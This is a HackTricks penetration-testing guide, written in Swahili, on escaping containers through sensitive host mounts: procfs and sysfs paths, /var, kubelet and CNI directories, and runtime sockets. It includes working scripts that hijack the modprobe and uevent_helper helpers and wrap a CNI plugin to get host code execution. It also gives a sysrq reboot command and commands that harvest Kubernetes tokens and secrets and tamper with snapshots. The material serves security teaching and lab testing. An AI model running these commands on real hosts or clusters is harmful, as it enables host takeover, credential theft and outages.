# Mount za Host Nyeti

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Mount za host ni mojawapo ya maeneo muhimu zaidi ya vitendo ya container-escape kwa sababu mara nyingi huvunja utenganishaji makini wa mwonekano wa mchakato na kurudisha mwonekano wa moja kwa moja wa rasilimali za host. Hali hatari hazihusiani tu na `/`. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, state inayodhibitiwa na kubelet, au paths zinazohusiana na devices zinaweza kufichua vidhibiti vya kernel, credentials, filesystems za containers jirani, na interfaces za usimamizi wa runtime.

Ukurasa huu upo tofauti na kurasa binafsi za ulinzi kwa sababu abuse model yake inahusisha maeneo mengi. Host mount inayoweza kuandikwa ni hatari kwa kiasi fulani kwa sababu ya mount namespaces, kwa kiasi fulani kwa sababu ya user namespaces, kwa kiasi fulani kwa sababu ya coverage ya AppArmor au SELinux, na kwa kiasi fulani kwa sababu ya host path halisi iliyowekwa wazi. Kuichukulia kama mada yake binafsi hurahisisha sana kuelewa attack surface.

## Ufunuo wa `/proc`

procfs ina taarifa za kawaida za michakato pamoja na interfaces zenye athari kubwa za udhibiti wa kernel. Kwa hiyo, bind mount kama `-v /proc:/host/proc` au mwonekano wa container unaofichua proc entries zinazoweza kuandikwa bila kutarajiwa unaweza kusababisha information disclosure, denial of service, au host code execution ya moja kwa moja.

Paths za procfs zenye thamani kubwa ni pamoja na:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (hasa `register` na `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Anza kwa kuangalia ni procfs entries zipi zenye thamani kubwa zinaonekana au zinaweza kuandikwa:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Njia hizi zinavutia kwa sababu tofauti. `core_pattern`, `modprobe`, na `binfmt_misc` zinaweza kuwa njia za host code-execution zinapoweza kuandikwa. `kallsyms`, `kmsg`, `kcore`, na `config.gz` ni vyanzo muhimu vya reconnaissance kwa kernel exploitation. `sched_debug` na `mountinfo` hufichua muktadha wa process, cgroup, na filesystem ambao unaweza kusaidia kujenga upya mpangilio wa host kutoka ndani ya container.

Thamani ya kiutendaji ya kila njia ni tofauti, na kuzichukulia zote kana kwamba zina impact sawa hufanya triage iwe ngumu zaidi:

- `/proc/sys/kernel/core_pattern`
Ikiwa inaweza kuandikwa, hii ni mojawapo ya njia za procfs zenye impact kubwa zaidi kwa sababu kernel itatekeleza pipe handler baada ya crash. Container inayoweza kuelekeza `core_pattern` kwenye payload iliyohifadhiwa kwenye overlay yake au kwenye host path iliyomountiwa mara nyingi inaweza kupata host code execution. Tazama pia [read-only-paths.md](protections/read-only-paths.md) kwa mfano maalum.
- `/proc/sys/kernel/modprobe`
Njia hii inadhibiti userspace helper inayotumiwa na kernel inapohitaji kuanzisha module-loading logic. Ikiwa inaweza kuandikwa kutoka kwenye container na kutafsiriwa katika host context, inaweza kuwa primitive nyingine ya host code-execution. Inavutia hasa inapounganishwa na njia ya ku-trigger helper path.
- `/proc/sys/vm/panic_on_oom`
Kwa kawaida hii si escape primitive safi, lakini inaweza kubadilisha memory pressure kuwa denial of service ya host nzima kwa kubadilisha hali za OOM kuwa kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Ikiwa registration interface inaweza kuandikwa, attacker anaweza kusajili handler kwa magic value iliyochaguliwa na kupata host-context execution wakati file inayolingana inapotekelezwa.
- `/proc/config.gz`
Ni muhimu kwa kernel exploit triage. Husaidia kubaini ni subsystems, mitigations, na optional kernel features zipi zimewezeshwa bila kuhitaji host package metadata.
- `/proc/sysrq-trigger`
Kwa kiasi kikubwa ni denial-of-service path, lakini ni hatari sana. Inaweza ku-reboot, kuleta panic, au kuvuruga host mara moja.
- `/proc/kmsg`
Hufichua ujumbe wa kernel ring buffer. Ni muhimu kwa host fingerprinting, crash analysis, na katika baadhi ya mazingira kwa ku-leak taarifa zinazosaidia kernel exploitation.
- `/proc/kallsyms`
Ni muhimu inapoweza kusomeka kwa sababu hufichua taarifa za exported kernel symbols na inaweza kusaidia kushinda assumptions za address randomization wakati wa kernel exploit development.
- `/proc/[pid]/mem`
Hii ni interface ya moja kwa moja ya process-memory. Ikiwa target process inafikika kwa masharti yanayohitajika ya ptrace-style, inaweza kuruhusu kusoma au kurekebisha memory ya process nyingine. Impact halisi inategemea sana credentials, `hidepid`, Yama, na ptrace restrictions, hivyo ni njia yenye nguvu lakini yenye masharti.
- `/proc/kcore`
Hufichua mwonekano wa system memory unaofanana na core image. File hii ni kubwa na ni ngumu kuitumia, lakini ikiwa inasomeka kwa maana, inaonyesha kuwa host memory surface imewekwa wazi kwa kiwango hatari.
- `/dev/kmem` na `/dev/mem`
Hizi ni raw-memory **device** interfaces zenye impact kubwa kihistoria, si files za procfs. Kwenye systems nyingi za kisasa hazipo au zimewekewa restrictions kali, lakini container inayoweza kufungua nakala iliyomountiwa kutoka kwa host inapaswa kuchukulia exposure hiyo kuwa critical. Zikague pamoja na sensitive `/dev` mounts nyingine badala ya kutafuta njia za `/proc/kmem` au `/proc/mem` ambazo hazipo.
- `/proc/sched_debug`
Huleak taarifa za scheduling na task ambazo zinaweza kufichua process identities za host hata wakati process views nyingine zinaonekana kuwa safi kuliko ilivyotarajiwa.
- `/proc/[pid]/mountinfo`
Ni muhimu sana kwa kujenga upya mahali container ilipo hasa kwenye host, kubaini ni paths zipi zinaotegemea overlay, na kuona ikiwa mount inayoweza kuandikwa inahusiana na host content au layer ya container pekee.

Ikiwa `/proc/[pid]/mountinfo` au maelezo ya overlay yanaweza kusomeka, yatumie kurejesha host path ya container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Amri hizi ni muhimu kwa sababu mbinu kadhaa za host-execution zinahitaji kubadilisha path iliyo ndani ya container kuwa path inayolingana kwa mtazamo wa host.

### Mfano: Kuandaa Path ya Msaidizi wa `modprobe`

Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka kwenye container na path ya msaidizi inatafsiriwa katika muktadha wa host, inaweza kuelekezwa kwenye payload inayodhibitiwa na mshambuliaji. Directory ya juu ya overlay lazima itatuliwe kutoka kwa host, na output ya uthibitisho lazima iandikwe tena kwenye layer hiyo hiyo ya container inayoonekana kwa host ikiwa container pia haija-mount host `/tmp`:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Kichocheo halisi hutegemea target na tabia ya kernel na hakikadiriwi kwa makusudi. Rejesha thamani ya awali kabla ya kuondoka kwenye lab. Jambo muhimu ni kwamba njia ya helper inayoweza kuandikwa inaweza kuelekeza invocation ya baadaye ya kernel helper kwenye maudhui ya host-path yanayodhibitiwa na attacker. `upperdir` ya overlay iliyokosekana, path ambayo host haiwezi kutatua, mount ya sysctl ya kusoma pekee, au kernel ambayo haiinvoke helper iliyochaguliwa huvunja mnyororo huu.

### Mfano Kamili: Kernel Recon Kwa `kallsyms`, `kmsg`, Na `config.gz`

Ikiwa lengo ni kutathmini exploitability badala ya kufanya escape mara moja:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Amri hizi husaidia kujibu ikiwa taarifa muhimu za symbols zinaonekana, ikiwa ujumbe wa hivi karibuni wa kernel unaonyesha hali ya kuvutia, na ni vipengele au mitigations gani za kernel zilizojumuishwa. Athari kwa kawaida si escape ya moja kwa moja, lakini inaweza kufupisha kwa kiasi kikubwa triage ya kernel-vulnerability.

### Mfano Kamili: SysRq Host Reboot

Ikiwa `/proc/sysrq-trigger` inaweza kuandikwa na kufikia mwonekano wa Host:
```bash
echo b > /proc/sysrq-trigger
```
Athari yake ni kuwashwa upya kwa host mara moja. Huu si mfano wa hila, lakini unaonyesha wazi kwamba kufichua procfs kunaweza kuwa hatari zaidi kuliko disclosure ya taarifa.

## `/sys` Exposure

sysfs hufichua kiasi kikubwa cha hali ya kernel na vifaa. Baadhi ya njia za sysfs zinafaa hasa kwa fingerprinting, huku nyingine zikiwa na uwezo wa kuathiri utekelezaji wa helper, tabia ya kifaa, usanidi wa security-module, au hali ya firmware.

Njia muhimu za sysfs ni pamoja na:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Njia hizi ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri tabia ya thermal-management na hivyo uthabiti wa host katika mazingira yaliyofichuliwa vibaya. `/sys/kernel/vmcoreinfo` inaweza kuvuja taarifa za crash-dump na mpangilio wa kernel zinazosaidia kufanya fingerprinting ya host kwa kiwango cha chini. `/sys/kernel/security` ni interface ya `securityfs` inayotumiwa na Linux Security Modules, hivyo access isiyotarajiwa hapo inaweza kufichua au kubadilisha hali inayohusiana na MAC. Njia za EFI variables zinaweza kuathiri mipangilio ya boot inayoungwa mkono na firmware, jambo linalozifanya ziwe hatari zaidi kuliko faili za kawaida za configuration. `debugfs` iliyo chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu imekusudiwa kuwa interface ya developers, ikiwa na matarajio machache zaidi ya usalama kuliko kernel APIs zilizolindwa kwa matumizi ya production.

Kila sysfs entry katika orodha hii inategemea **kernel, configuration, na hardware**. Nodes za sasa za virtualized mara nyingi hazijumuishi `uevent_helper`, EFI variables, na thermal-device entries kabisa. Rekodi njia ambayo haipo kama sharti hasi badala ya kudhani kwamba mfano kutoka kernel nyingine unatumika.

Amri muhimu za review kwa njia hizi ni:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Ni nini kinachofanya commands hizo ziwe za kuvutia:

- `/sys/kernel/security` inaweza kufichua ikiwa AppArmor, SELinux, au LSM nyingine inaonekana kwa njia ambayo ilipaswa kubaki kwenye host pekee.
- `/sys/kernel/debug` mara nyingi ndiyo finding yenye kutisha zaidi katika kundi hili. Ikiwa `debugfs` ime-mountiwa na inaweza kusomwa au kuandikwa, tarajia surface pana inayolenga kernel, ambapo risk halisi inategemea debug nodes zilizowezeshwa.
- Ufunuaji wa EFI variables si wa kawaida sana, lakini ukiwepo una impact kubwa kwa sababu unagusa mipangilio inayoungwa mkono na firmware badala ya files za kawaida za runtime.
- `/sys/class/thermal` inahusiana zaidi na uthabiti wa host na mwingiliano na hardware, si escape safi ya mtindo wa shell.
- `/sys/kernel/vmcoreinfo` ni chanzo cha host-fingerprinting na crash-analysis hasa, kinachofaa kuelewa hali ya kernel ya kiwango cha chini.

### Mfano Kamili: `uevent_helper`

`/sys/kernel/uevent_helper` inategemea kernel na configuration na haipo kwenye systems nyingi za sasa. Ikiwepo, inaweza kuandikwa, na trigger ya `uevent` inayoweza kutumika inapatikana, kernel inaweza ku-execute helper inayodhibitiwa na attacker. Proof output lazima itumie path inayoonekana kutoka kwenye mitazamo ya host na container:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Sababu inayofanya hii ifanye kazi ni kwamba helper path inatafsiriwa kutoka kwa mtazamo wa host. Mara tu inapochochewa, helper huendeshwa katika muktadha wa host badala ya ndani ya container ya sasa. `/sys/class/mem/null/uevent` ni trigger moja halisi kwenye kernels zinazoionyesha; vifaa vingine vinaweza kuonyesha faili zao za `uevent`, lakini usichague moja bila kufikiri kwenye hardware halisi. Rejesha thamani ya awali kabla ya kuondoka kwenye lab. Usiripoti technique hii kuwa inapatikana wakati helper file au trigger inayodhibitiwa haipo.

## Ufunuaji wa `/var`

Kumount host's `/var` ndani ya container mara nyingi hudharauliwa kwa sababu hakuonekani kuwa kwa kiwango cha kushangaza kama kumount `/`. Kiutendaji, kunaweza kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na filesystems za applications zilizo jirani. Kwenye nodes za kisasa, `/var` mara nyingi ndiko kunakopatikana container state yenye umuhimu mkubwa zaidi wa kiutendaji.

### Mfano wa Kubernetes

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma projected tokens za pods nyingine na overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinajibu ikiwa mount inaonyesha data ya kawaida tu ya application au credentials muhimu za cluster. Service-account token inayoweza kusomwa inaweza kubadilisha mara moja code execution ya ndani kuwa access ya Kubernetes API.

Ikiwa token ipo, thibitisha kile inachoweza kufikia badala ya kuishia kwenye token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Athari hapa inaweza kuwa kubwa zaidi kuliko ufikiaji wa node ya ndani. Token yenye RBAC pana inaweza kubadilisha `/var` iliyowekwa mount kuwa compromise ya cluster nzima.

### Mfano wa Docker na containerd

Kwenye Docker hosts, data husika mara nyingi hupatikana chini ya `/var/lib/docker`, huku kwenye Kubernetes nodes zinazotumia containerd inaweza kupatikana chini ya `/var/lib/containerd` au paths maalum za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ikiwa `/var` iliyowekwa inafichua maudhui ya snapshot yanayoweza kuandikwa ya workload nyingine, mshambulizi anaweza kubadilisha mafaili ya programu, kuweka maudhui ya wavuti, au kubadilisha scripts za startup bila kugusa configuration ya container ya sasa.

Kwenye **disposable lab workload**, maudhui ya snapshot yanayoweza kuandikwa yanaweza kuonyesha application tampering, secret recovery, au lateral movement. Kwanza linganisha runtime container ID na snapshot sahihi, na usiwahi kuhariri snapshot isiyohusiana au ya production:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Amri hizi ni muhimu kwa sababu zinaonyesha familia tatu kuu za athari za `/var` iliyomountiwa: tampering ya application, urejeshaji wa secret, na lateral movement kuelekea workloads zilizo jirani.

Uandishi wa moja kwa moja wa snapshot hupita usimamizi wa kawaida wa state wa runtime na unaweza kuharibu container au kuangamiza ushahidi. Ugunduzi wa read-only ulifanywa tena locally dhidi ya Docker `overlay2`: marker iliyoandikwa katika container ya muda iliyo jirani ilionekana chini ya `/var/lib/docker/overlay2/<id>/diff/`. Weka urekebishaji halisi wa snapshot kwenye container ya muda iliyoundwa kwa ajili ya test hiyo pekee.

## Kubelet State, Plugins, And CNI Paths

Mount ya `/var/lib/kubelet`, `/opt/cni/bin`, au `/etc/cni/net.d` mara nyingi hufichuliwa kupitia privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, na storage helpers. Mount hizi ni rahisi kupuuzwa kama "node plumbing", lakini zinapatikana moja kwa moja katika execution path ya pods mpya na mara nyingi huwa na credentials za kubelet, projected secrets, registration sockets, na executable host-side plugin binaries.

Malengo yenye thamani kubwa ni pamoja na:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Amri muhimu za review ni:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Kwa nini paths hizi ni muhimu:

- `/var/lib/kubelet/pki` inaweza kufichua kubelet client certificates na credentials nyingine za node-local ambazo wakati mwingine zinaweza kutumiwa tena dhidi ya API server au kubelet-facing TLS endpoints, kutegemea muundo wa cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` mara nyingi huwa na projected service-account tokens na mounted Secrets za pods zilizo karibu kwenye node hiyo hiyo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` hasa ni reconnaissance surface, lakini ni muhimu sana: hufichua ni pods na containers zipi kwa sasa zinamiliki GPUs, hugepages, vifaa vya SR-IOV, na rasilimali nyingine adimu za node-local.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, na `/var/lib/kubelet/plugins_registry` hufichua ni CSI, DRA, na device plugins zipi zimesakinishwa na ni sockets zipi kubelet inatarajiwa kuwasiliana nazo. Ikiwa directories hizo zinaweza kuandikwa badala ya kusomeka tu, finding hiyo inakuwa serious zaidi.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` na `/etc/cni/net.d` ziko moja kwa moja kwenye njia ya pod-network setup. Writable access huko mara nyingi huwa delayed host-execution primitive badala ya kuwa configuration exposure pekee.<sup>[[2]](#references)</sup>

### Mfano Kamili: Writable `/opt/cni/bin`

Ikiwa host CNI binary directory ime-mountiwa read-write, kubadilisha plugin kunaweza kutosha kupata host execution wakati mwingine kubelet inapounda pod sandbox kwenye node hiyo:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Hii si ya haraka kama `docker.sock` iliyowekwa, lakini mara nyingi huwa uhalisia zaidi katika Kubernetes infrastructure pods zilizoathiriwa. Marker huandikwa kando ya plugin iliyowekwa ili kontena liweze kuipata hata bila mount ya host-root au host-`/tmp`. Wrapper huhifadhi arguments za awali na standard input, kisha mfano hurejesha binary ya awali. Jambo muhimu ni kwamba binary iliyorekebishwa huendeshwa baadaye na mtiririko wa usanidi wa host network, si na kontena la sasa. Tumia node ya kutupwa pekee kwa sababu wrapper isiyo sahihi inaweza kuzuia Pod sandboxes mpya kupokea networking.

## Runtime Sockets

Mounts nyeti za host mara nyingi hujumuisha runtime sockets badala ya directories kamili. Hizi ni muhimu sana hivi kwamba zinastahili kurudiwa wazi hapa:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Angalia [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa mtiririko kamili wa exploitation baada ya mojawapo ya sockets hizi ku-mountiwa.

Kama pattern ya kwanza ya mwingiliano wa haraka:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ikiwa mojawapo ya hizi itafaulu, njia kutoka kwa "mounted socket" hadi "start a more privileged sibling container" kwa kawaida huwa fupi zaidi kuliko njia yoyote ya kernel breakout.

## Writable Host Path Task Hijack

Mount ya host inayoweza kuandikwa haihitaji kufichua `/` ili iwe hatari. Ikiwa path iliyomountiwa ina scripts, config files, hooks, plugins, au files zinazotumiwa baadaye na scheduled task au service ya upande wa host, container inaweza kubadilisha kile ambacho host ita-execute.

Mtiririko wa jumla wa ukaguzi:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Ikiwa faili linaloweza kuandikwa linatumiwa na host process, wakati wa kufanya majaribio, weka payload rahisi na inayoweza kuonekana:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Sehemu ya kuvutia ni trust boundary: write hufanyika kutoka ndani ya container, lakini execution hufanyika baadaye katika muktadha wa host service. Hii hugeuza hostPath au bind mount nyembamba kuwa primitive ya host-code-execution iliyocheleweshwa.

## CVEs Zinazohusiana na Mount

Host mounts pia huingiliana na udhaifu wa runtime. Mifano muhimu ya hivi karibuni ni:

- `CVE-2024-21626` katika `runc`, ambapo directory file descriptor iliyovuja ingeweza kuweka working directory kwenye host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, na `CVE-2024-23653` katika BuildKit, ambapo Dockerfiles, frontends, na mtiririko wa `RUN --mount` wenye nia hasidi ungeweza kurejesha ufikiaji wa host files, ufutaji, au privileges zilizoinuliwa wakati wa builds.
- `CVE-2024-1753` katika Buildah na Podman build flows, ambapo bind mounts zilizoundwa kwa njia maalum wakati wa build zingeweza kufichua `/` kwa read-write.
- `CVE-2025-47290` katika `containerd` 2.1.0, ambapo TOCTOU wakati wa image unpack ingeweza kuruhusu image iliyoundwa kwa njia maalum kurekebisha host filesystem wakati wa pull.

CVE hizi ni muhimu hapa kwa sababu zinaonyesha kuwa ushughulikiaji wa mount hauhusu tu operator configuration. Runtime yenyewe pia inaweza kuanzisha escape conditions zinazoendeshwa na mount.

## Ukaguzi

Tumia commands hizi kupata kwa haraka mount exposures zenye thamani kubwa zaidi:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Kinachovutia hapa:

- Host root, `/proc`, `/sys`, `/var`, na runtime sockets zote ni findings zenye kipaumbele cha juu.
- Entries za proc/sys zinazoweza kuandikwa mara nyingi humaanisha kuwa mount inaonyesha vidhibiti vya kernel vya host nzima badala ya view salama ya container.
- Njia za `/var` zilizowekwa mount zinahitaji ukaguzi wa credentials na workloads jirani, si ukaguzi wa filesystem pekee.
- Directories za hali ya Kubelet na paths za CNI/plugin zinahitaji kipaumbele sawa na runtime sockets kwa sababu mara nyingi huwa moja kwa moja kwenye njia ya node ya kuunda pods na kusambaza credentials.

## Hali ya Uthibitishaji wa Ndani

Chains za kiutendaji kwenye ukurasa huu zilichunguzwa dhidi ya Linux minikube node ya ndani. Uthibitishaji ulifanikiwa kuonyesha:

- access ya kusoma na kuandika kupitia temporary writable hostPath
- ugunduzi wa projected ServiceAccount tokens na mounted Secrets kupitia `/var/lib/kubelet/pods`
- authentication iliyofanikiwa ya Kubernetes API kwa kutumia token hai iliyopatikana kutoka kwenye hali hiyo ya kubelet iliyowekwa mount
- ugunduzi wa kusoma pekee wa filesystem ya jirani ya Docker `overlay2` kupitia `/var` iliyowekwa mount
- uundaji wa sibling container kupitia Docker API yenye read-only host bind kwa kutumia `docker.sock` iliyowekwa mount
- utekelezaji wa host uliocheleweshwa kupitia temporary host-consumed hook
- simulation ya CNI-wrapper iliyohifadhi arguments za plugin ya awali, standard input, na execution

Node hiyo hiyo ilifichua `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore`, na `config.gz`, lakini haikufichua `uevent_helper`, EFI variables, thermal entries, au `sched_debug`. Destructive kernel triggers hazikutekelezwa. Hii inathibitisha kuwa chains za host-root, `/var`, kubelet-state, socket, na host-consumer zinaweza kurudiwa, ilhali mbinu za procfs/sysfs helper lazima zibaki zikiwa na masharti kulingana na kernel husika, mount mode, payload path, na trigger.

## References

- [1] [Files na Paths za Ndani Zinazotumiwa na Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [container ya cilium-agent inaweza kufikia host kupitia mount ya `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
